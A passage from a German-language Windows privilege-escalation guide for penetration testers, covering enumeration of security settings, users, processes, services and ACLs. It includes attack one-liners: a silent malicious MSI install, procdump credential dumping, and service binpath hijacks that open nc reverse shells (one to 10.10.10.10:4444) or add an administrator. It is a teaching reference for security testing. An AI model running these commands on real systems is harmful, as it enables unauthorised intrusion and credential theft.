  - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei **im Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus und Erkennungsprogramme

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Bei Windows Event Forwarding ist es interessant zu wissen, wohin die Logs gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administratorpasswörter** und stellt sicher, dass jedes Passwort auf in eine Domäne eingebundenen Computern **einzigartig, zufällig generiert und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern mit ausreichenden Berechtigungen über ACLs abgerufen werden, sodass sie autorisierte Benutzer einsehen können.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn WDigest aktiv ist, werden **Passwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, ihren **Speicher auszulesen** oder Code einzuschleusen und so das System besser zu schützen.\
[**Weitere Informationen zu LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard findest du hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden üblicherweise Domänenanmeldeinformationen für den Benutzer eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldeinformationen**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Gruppen mit erweiterten Rechten

Wenn du **einer Gruppe mit erweiterten Rechten angehörst, kannst du möglicherweise deine Berechtigungen erweitern**. Erfahre hier mehr über Gruppen mit erweiterten Rechten und wie du sie missbrauchen kannst, um deine Berechtigungen zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre auf dieser Seite mehr darüber**, was ein **Token** ist: [**Windows-Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du mehr über **interessante Tokens** und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Überprüfe beim Auflisten der Prozesse zunächst **die Befehlszeile des Prozesses auf Passwörter**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Suchen Sie immer nach möglicherweise laufenden [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), die Sie zur Privilegieneskalation missbrauchen könnten.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht zu sehen ist, beweist daher nicht, dass er nie erreichbar war. Gleichen Sie jeden beobachteten Listener mit seiner PID, dem Prozesseigentümer und der Möglichkeit des Benutzers mit niedrigeren Rechten ab, ihn zu erreichen. Ein Anwendungsname oder ein Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Beschränken Sie die routinemäßige Enumeration auf passive Methoden und senden Sie keine Debugger-Befehle.

**Berechtigungen der Binärdateien der Prozesse überprüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Prüfe bei einer geplanten Aufgabe oder einem Dienst, der Snort unter einem anderen Konto ausführt, genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, sollte der Pfad daraufhin überprüft werden, ob Code ausgeführt werden kann, wenn diese Aufgabe oder dieser Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie mögliche Deny- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Privilegieneskalation. Die [Dokumentation zu Snorts dynamischem Präprozessor](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem Dokumentstammverzeichnis

Vergleiche bei einer Windows-Apache-Installation den ausführbaren Pfad und das Run-as-Konto des Dienstes mit dem `DocumentRoot` in der aktiven `httpd.conf`. Prüfe bei einem üblichen XAMPP-Layout `C:\xampp\apache\conf\httpd.conf` und die ACL des dort konfigurierten Dokumentstammverzeichnisses, oft `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` ausgeführt wird, kann die serverseitige Codeausführung die Privilegiengrenze des Hosts überschreiten. Bestätige, dass der Dienst läuft, dass genau dieser Pfad bereitgestellt wird und dass ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Stammverzeichnis allein belegt nur die Möglichkeit, Dateien zu erstellen. Prüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation kann der Dienst auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`) verweisen. Die Konfiguration liegt daneben unter `conf\httpd.conf`, und das Standard-Stammverzeichnis ist `C:\wamp64\www` oder `C:\wamp\www`. Prüfe gemeinsam das genaue Dienstabbild, die Ausführungsidentität, das effektive `DocumentRoot` (einschließlich der Expansion von `${INSTALL_DIR}` und Überschreibungen durch virtuelle Hosts) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt weder, dass Apache als `SYSTEM` läuft, noch, dass die eingereichte Datei ausgeführt wird. [Apache beschreibt, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordne bei IIS ein beschreibbares physisches Verzeichnis in `applicationHost.config` einer **aktiven Website/Anwendung** zu und ermittle anschließend den dafür konfigurierten Pool und den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe den effektiven Dateierstellungszugriff des aktuellen Benutzers, den Laufzeitstatus der Website, den Handler und pfadspezifische Überschreibungen, bevor du ein beschreibbares Verzeichnis als Codeausführungsmöglichkeit einstufst.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der relevanten .NET-Framework-Installation; `<compilation tempDirectory>` der Anwendung kann den Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse voneinander zu isolieren, wenn Anwendungspools einander nicht vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Wenn ein Token mit niedrigeren Berechtigungen generierten Quellcode im Cache der **konkreten** Anwendung verändern kann, ermittle, ob diese Anwendung ihn unter einer höher privilegierten [Workerprozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Gleiche den Cache mit der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer möglichen Neukompilierung ab. Prüfe Metadaten ausschließlich lesend; löse während der Bestandsaufnahme keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich gegenüber Domänenressourcen üblicherweise als **Computerkonto des Hosts**, auch wenn sein lokales Token nur geringe Berechtigungen hat. `LocalSystem` ist lokal bereits hoch privilegiert und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` verwendet normalerweise anonyme Netzwerkanmeldedaten. Ein Pool mit `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) und [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Pool-Standardeinstellungen übernehmen, die sich je nach IIS-Version unterscheiden. Ermittle daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Wenn die Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos erreicht, prüfe die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Maschin account-Ticket oder die Rolle des Hosts allein belegt diese Rechte nicht. Bei der passiven Bestandsaufnahme sollten Konfiguration und ACLs geprüft werden, ohne eine Datei hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Verfolge bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann es ermöglichen, dass Shell-Metazeichen den Befehl verändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, dass ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermittle anschließend die effektive Identität des Anwendungspools oder die Identität bei der Identitätsübernahme sowie die Identität des Kindprozesses. Eine lesbare Quellcodezeile, ein Listener auf localhost oder eine Schwäche des Tokenformats allein belegt keine privilegierte Befehlsausführung. Prüfe Quellcode und Poolkonfiguration, ohne während der passiven Bestandsaufnahme gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein durch eine Anfrage gesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine für den Benutzer mit geringeren Berechtigungen beschreibbare PHP-Datei unter der Identität des Workerprozesses auswerten. Bestätige, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Workerprozess lesen kann, geltende PHP-Pfadbeschränkungen das Einbinden zulassen und der Workerprozess tatsächlich mit höheren Berechtigungen läuft. Ein Listener auf Loopback oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne den Endpunkt während der passiven Bestandsaufnahme aufzurufen.

### Memory Password mining

Mit **procdump** aus Sysinternals kannst du einen Speicherauszug eines laufenden Prozesses erstellen. Dienste wie FTP halten **Anmeldedaten im Klartext im Speicher**. Versuche, den Speicher auszulesen und die Anmeldedaten zu ermitteln.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen und auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem für Benutzer mit geringeren Rechten beschreibbaren Drop-Verzeichnis öffnet, überschreitet eine Eingabevertrauensgrenze unter dem Konto des Importers. Prüfe den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und die Parser-Version. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte XML External Entities in Projektmetadaten; eine Netzwerk-Entity unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, wenn die [Richtlinien für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zuließen. Das ist ein Hinweis auf mögliche Offenlegung von Zugangsdaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffne bei der passiven Aufklärung kein manipuliertes Projekt; prüfe den Importablauf und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) des Service Control Manager (SCM)-Objekts ist von den Rechten für einen vorhandenen Dienst getrennt. Eine erfolgreiche, nur lesende [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das bei der Erstellung die angeforderten Dienstzugriffsrechte besitzt; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffskontrolle durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfe separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Startkonfiguration und den Pfad zur ausführbaren Datei. Erstelle oder starte bei der passiven Aufklärung keinen Dienst.

Bei einem Remote-Pfad zur Dienstinstallation müssen diese SCM-Rechte mit einer Freigabe auf dem Ziel korreliert werden, in die **dieselbe Netzwerk-Anmeldung** schreiben kann, ebenso mit der zugrunde liegenden NTFS-ACL und einem lokalen Pfad zur ausführbaren Datei, die das Dienstkonto ausführen kann. Ein Konto ohne Administratorrechte kann diese Grenze überwinden, wenn ungewöhnlich weitreichende SCM-Rechte und ein Pfad zum Ablegen der Datei gleichzeitig vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Recht zum Erstellen eines Dienstes allein belegt nicht, dass der neue Dienst mit höheren Rechten gestartet werden kann.

Ein vorhandener Dienst kann bei Start, Herunterfahren oder einem anderen Lebenszyklusereignis eine Hilfsdatei aufrufen, selbst wenn diese nicht in seinem `ImagePath` aufgeführt ist. Wird der Name der Hilfsdatei in ein für Benutzer mit geringeren Rechten beschreibbares Verzeichnis aufgelöst und läuft der Dienst mit höheren Rechten, kann eine fehlende Hilfsdatei unter bestimmten Bedingungen ersetzt werden. Bestätige den **tatsächlichen Dienstcode oder den dokumentierten Aufruf der Hilfsdatei**, den aufgelösten Pfad zur ausführbaren Datei und die Suchreihenfolge, die Verzeichnis-Erstellungsrechte, die Dienstidentität und einen verfügbaren Auslöser für das Lebenszyklusereignis. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; bei einer passiven Prüfung sollte der Dienst nicht gestartet oder beendet werden.

Bei einem vorhandenen Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht unterscheidet sich von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Prüfe den Dienstcode oder die dokumentierte Schnittstelle, bevor du das Startrecht als mehr als ein Steuerungsrecht einstufst. Verwendet der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad, prüfe die Dienstidentität, den genauen Ablauf vom Argument bis zum Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Prozess oder Loader diese Datei verarbeitet; ein beschreibbares Protokoll oder ein Startrecht allein reicht nicht aus. Bei der passiven Bestandsaufnahme sollte der Dienst weder gestartet noch eine Testdatei erstellt werden.

Bei einem NSClient++-Überwachungsagenten ist eine lesbare `nsclient.ini` ein **Hinweis zur Konfigurationsprüfung**: Sie kann Zugangsdaten für das Webinterface enthalten, während `boot.ini` die Konfiguration an einen anderen Ort umleiten kann. Prüfe das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Für eine privilegierte Ausführung sind außerdem `CheckExternalScripts` (oder ein anderer aktivierter Ausführungspfad), ein tatsächlich wirksames Recht zum Registrieren oder Ändern eines Befehls und ein Auslöser erforderlich, der ihn unter der Dienstidentität ausführt. Auch ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer erreichbar sein, aber Dateipfad, Passwort oder Listener allein belegen diese Rechte nicht. Prüfe Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder während der passiven Aufklärung die Web-API aufzurufen. Siehe das [NSClient++-Dateilayout](https://nsclient.org/docs/concepts/file-layout/), die [Sicherheitshinweise zu Webinterface und Skripten](https://nsclient.org/docs/setup/securing/) und die [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` auf `nssm.exe` verweist, prüfe das tatsächliche Ausführungskonto des Dienstes und seinen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert die untergeordnete Anwendung dort](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis angibt. Prüfe die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor du die Berechtigungen des Wrappers als gesamte Dienstgrenze betrachtest. Ein lokaler WCF- oder SOAP-Endpunkt, den diese untergeordnete Anwendung bereitstellt, ist ein separater Prüfhinweis: Bestätige, dass der Endpunkt für den Benutzer mit geringeren Rechten erreichbar ist, der konkrete Vorgang dessen Eingaben akzeptiert und die untergeordnete Dienstanwendung den unsicheren Vorgang mit höheren Rechten ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein belegt keine Rechteausweitung; rufe bei der passiven Aufklärung keine Dienstvorgänge auf.

Verfolge bei einem benutzerdefinierten WCF-Vorgang eine vom Aufrufer kontrollierte Zeichenfolge bis zu einem PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Eine [`netTcpBinding` mit Windows-Transportanmeldedaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, aber die Berechtigung zum Aufrufen genau dieses Vorgangs und die effektive Identität des Runspaces müssen separat geprüft werden. Ein Pfad von einer Eingabe eines Aufrufers mit geringeren Rechten zu `AddScript` unter einer höheren Dienstidentität bildet eine Codeausführungsgrenze; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfe den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Impersonation-Einstellungen statisch, ohne den Endpunkt während der Aufklärung aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst bei bestimmten Ereignissen zu starten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteverbindung, GPO-Aktualisierung usw.). Auch ohne SERVICE_START-Rechte können privilegierte Dienste oft durch Auslösen ihrer Trigger gestartet werden. Aufzählungs- und Aktivierungstechniken findest du hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-Dienst für Diagnosesammlung

Visual Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der so konfiguriert ist, dass er als `LocalSystem` ausgeführt wird. Bei [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wurde ein Junction- und Object-Manager-Link-Race verwendet, um eine DACL-Zurücksetzung des Dienstes umzuleiten. Die demonstrierte Rechteausweitung erforderte außerdem einen nutzbaren Reparaturpfad über das Visual Studio Setup WMI Provider MSI und dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Die Komponente wurde im Januar 2024 korrigiert.

Für eine passive Ersteinschätzung prüfe das Konto und den Binärpfad dieses einen Dienstes, kontrolliere, ob der Pfad zum Setup-WMI-Compiler vorhanden ist, und verifiziere den Patch-Status der installierten Komponente. Ein Diensteintrag, die Visual-Studio-Produktversion oder eine Compilerdatei allein belegen nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Liste der Dienste abrufen:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Mit **sc** kannst du Informationen zu einem Dienst abrufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ irgendeinen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Hier können Sie accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Sie können ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost unter XP SP1 von SSDPSRV abhängig ist.**

**Eine weitere Abhilfe** für dieses Problem ist, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ im betreffenden Szenario über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So lässt sich **sc** ändern und ausführen:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Durch verschiedene Berechtigungen können Privilegien eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern der Dienstkonfiguration.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Sicherheitslücke kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder als privilegiertes Domänenkonto ausgeführt wird, **Benutzer mit geringen Berechtigungen aber die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst oft kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** kannst du alle von einem Dienst ausgeführten Binärdateien abrufen (nicht in system32) und deine Berechtigungen mit **icacls** überprüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achten Sie auf gefährliche ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Dienstdatei oder das Verzeichnis, in dem sie liegt. Ein praktischer Ablauf für den Missbrauch ist:<sup>[[27]](#references)</sup>

1. Ermitteln Sie das Dienstkonto und den Pfad zur ausführbaren Datei mit `sc qc <service_name>`.
2. Prüfen Sie mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetzen Sie die Dienstdatei durch ein Payload oder eine gültige schädliche Dienstdatei.
